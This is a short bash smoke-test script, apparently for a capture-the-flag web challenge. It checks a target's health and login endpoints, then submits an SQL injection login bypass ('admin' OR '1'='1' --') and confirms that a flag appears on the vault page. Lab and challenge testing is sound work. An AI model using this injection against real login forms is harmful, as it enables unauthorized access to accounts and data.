#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-http://localhost:8080}"

echo "== Smoke Test =="
code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/_health")
[ "$code" = "200" ] || { echo "Health check failed: $code"; exit 1; }

code=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/login")
[ "$code" = "200" ] || { echo "/login failed: $code"; exit 1; }

# SQLi via curl
html=$(curl -s -L -c /tmp/cv_cookie.txt -b /tmp/cv_cookie.txt \
  -d "username=admin' OR '1'='1' -- &password=aaa" \
  "$TARGET/login" && curl -s -L -b /tmp/cv_cookie.txt "$TARGET/vault")

echo "$html" | grep -q "Exploit3rs{" && echo "[OK] Flag visible in vault" || { echo "[FAIL] Flag not found"; exit 1; }
